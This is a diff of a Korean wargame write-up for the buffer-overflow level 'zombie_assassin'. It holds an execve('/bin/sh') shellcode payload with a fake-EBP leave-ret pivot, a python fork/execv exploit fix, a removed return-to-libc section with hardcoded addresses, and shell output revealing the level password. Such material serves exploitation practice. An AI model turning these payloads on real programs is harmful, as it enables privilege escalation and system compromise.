@@ -119,7 +119,16 @@ payload 시나리오 :
 ./zombie_assassin `python -c 'print "\x64\xfc\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*12+"\x5c\xfc\xff\xbf"+"\xdf\x84\x04\x08"'`
 ```
 
+```
+릱릱?@?@廈@릱릱릱릱릱릱릱릱릱릱릱릱`?욀?   ☻
+bash$ id
+uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
+bash$ my-pass
+euid = 516
+no place to hide
+```
 
+------
 
 ##### python
 
@@ -147,53 +156,10 @@ payload = append(p32(leave_ret))
 
 pid = os.fork()
 if pid == 0:
-        os.execv(target, ("", payload))
+        os.execv(target, (target, payload))
 else:
         os.waitpid(pid, 0)
 ```
 
-
-
 ------
 
-
-
-#### RTL (Return to Library)를 이용한 공격
-
-> RTL을 이용한 공격시 이전과 시간과 환경 차이가 있어 주소가 상이함
-
-##### exploit 시나리오 :
-
-```
-./zombie_assassin `python -c print "\x90"*4+&system()"+"\x90"*4+"&["/bin/sh"]"+"\x90"*24+"&buf"+"&leave-ret 가젯"
-```
-
-&buf : 0xbffffc60
-
-&leave-ret : 0x080484df
-
-&system() : 0x40058ae0
-
-&"/bin/sh" : 0x400fbff9
-
-
-
-##### Payload
-
-```
-./zombie_assassin `python -c 'print "\x90"*4+"\xe0\x8a\x05\x40"*2+"\xf9\xbf\x0f\x40"+
-"\x90"*(40-16)+"\x60\xfc\xff\xbf"+"\xdf\x84\x04\x08"'`
-```
-
-```
-릱릱?@?@廈@릱릱릱릱릱릱릱릱릱릱릱릱`?욀?   ☻
-bash$ id
-uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
-bash$ my-pass
-euid = 516
-no place to hide
-```
-
-
-
------
